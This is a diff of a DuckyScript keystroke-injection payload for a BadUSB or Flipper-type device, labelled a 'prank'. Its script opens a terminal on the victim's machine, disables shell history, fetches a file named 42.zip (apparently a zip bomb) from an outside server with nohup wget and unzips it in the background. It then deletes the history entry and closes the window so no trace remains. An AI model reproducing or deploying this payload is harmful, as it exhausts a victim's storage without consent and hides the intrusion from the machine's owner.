@@ -6,38 +6,18 @@ REM Version: 1.0
 REM Category: Prank
 REM zipbomb I found and thought I would have some fun with. Covers tracks, opens a background download/unzip, and closes the terminal for no trace.
 DELAY 300
-REM Minimize all windows as that ensures launch happens smoother and when the terminal is launch everything else is relaunched for no trace of funny business.
+REM Minimize all windows as that ensures launch happens smoother and when the terminal is launched everything else is relaunched for no trace of funny business.
 WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 1500
-REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the last entry ;)
+REM sneak +1 don't delete the whole history or mess with size settings, just turn history off and delete the history change entry ;)
 STRING set +o history
 DELAY 300
 ENTER
 REM FIRE IN THE HOLE!
-STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null  &&  unzip 42.zip >/dev/null &
-DELAY 300
+STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null  &&  unzip 42.zip >/dev/null && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+DELAY 500
 ENTER
-DELAY 1500
-CTRL C
-DELAY 300
-CTRL C
-REM i'm sure there's a better way to do that.
-DELAY 300
-REM sneak +1 cover your tracks
-STRING history | grep history
-DELAY 200
-ENTER
-STRING line=$(history | grep history | awk '{ print $1 }')
-DELAY 200
-ENTER
-STRING history -d $line
-DELAY 200
-ENTER
-DELAY 200
-STRING set -o history && exit
-DELAY 200
-ENTER
-DELAY 300
-REM insert capslock flashing code here if not using a flipper or other debugger.
+DELAY 500
+ALT F4
